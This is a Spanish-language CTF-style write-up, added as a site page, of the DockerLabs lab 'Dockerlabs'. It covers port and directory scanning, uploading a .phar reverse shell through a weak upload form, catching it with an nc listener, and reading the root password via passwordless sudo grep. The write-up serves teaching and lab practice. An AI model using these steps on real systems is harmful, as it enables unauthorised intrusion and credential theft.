@@ -1,0 +1,215 @@
+---
+title: Dockerlabs
+description: Resolución completa de la máquina virtual *Dockerlabs* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Dockerlabs**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web con una funcionalidad de subida de archivos que permite extensiones `.phar`, lo que facilita la ejecución remota de comandos. Tras subir una reverse shell y obtener acceso como `www-data`, se identifica una configuración insegura de `sudo` que permite ejecutar `grep` como root, lo que posibilita leer archivos restringidos como `/root/clave.txt`. Con la contraseña obtenida, se accede directamente como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Dockerlabs',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Fácil',
+    Fecha: '17/07/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Dockerlabs.zip
+sudo bash auto_deploy.sh Dockerlabs.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Dockerlabs/{content,exploits,nmap,scripts}
+cd Dockerlabs
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1763011473/Ports_tenkha.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1763012626/Gobuster_t6ooqz.png)
+
+**Rutas relevantes:**
+- `/index.php` — Página principal con listado de máquinas.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1763011472/Index_n1pgfv.png)
+- `/machine.php` — Formulario que permite subir archivos.
+  ![Machine.php](https://res.cloudinary.com/dewqswzke/image/upload/v1763011473/Machine.php_nhmxzx.png)
+- `/uploads` — Directorio accesible donde se almacenan los archivos subidos.
+- `/uploads.php` — Página que confirma la subida de archivos.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Subida de reverse shell
+
+El formulario de `machine.php` solo acepta archivos `.zip` aparentemente. Sin embargo, se descubre que los archivos **`.phar`** no están bloqueados, lo que permite subir código ejecutable.
+
+Se sube una reverse shell en formato `.phar`. Se confirma la carga revisando el directorio público:
+
+![Uploads](https://res.cloudinary.com/dewqswzke/image/upload/v1763011475/Uploads_hzrdtz.png)
+
+### 2.2 Reverse shell
+
+Se prepara un listener en la máquina atacante:
+
+```bash
+nc -nlvp 443
+```
+
+Se accede desde el navegador al archivo malicioso:
+
+```
+http://172.17.0.2/uploads/revShell.phar
+```
+
+Se obtiene una **reverse shell como www-data**:
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1763011474/RevShellConnect_r9vcnl.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1763011475/Sudo-lWW-data_o7lgyi.png)
+
+El usuario puede ejecutar `grep` como root sin contraseña, lo que permite leer cualquier archivo del sistema.
+
+Se explora el sistema y se encuentra:
+
+```
+/opt/nota.txt
+```
+
+![Nota.txt](https://res.cloudinary.com/dewqswzke/image/upload/v1763011473/Nota.txt_ewmotl.png)
+
+La nota revela que la contraseña de root se encuentra en:
+
+```
+/root/clave.txt
+```
+
+Se usa `grep` para leer el archivo con privilegios:
+
+```bash
+sudo grep '' /root/clave.txt
+```
+
+![Clave.txt](https://res.cloudinary.com/dewqswzke/image/upload/v1763011472/ContentClave.txt_bkqzpp.png)
+
+Con la contraseña, se inicia sesión como root:
+
+```bash
+su root
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1763011474/Root_sjprts.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Validación deficiente en subida de archivos (.phar permitido)",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como www-data"
+    },
+    {
+      vulnerability: "Exposición del directorio /uploads sin restricciones",
+      severity: "Alta",
+      impact: "Acceso y ejecución de archivos maliciosos subidos"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en grep",
+      severity: "Alta",
+      impact: "Lectura de archivos restringidos del sistema"
+    },
+    {
+      vulnerability: "Contraseña de root almacenada en texto plano",
+      severity: "Crítica",
+      impact: "Compromiso total del sistema"
+    },
+    {
+      vulnerability: "Falta de validación de contenido de archivos subidos",
+      severity: "Alta",
+      impact: "Subida de código ejecutable malicioso"
+    }
+  ]}
+/>
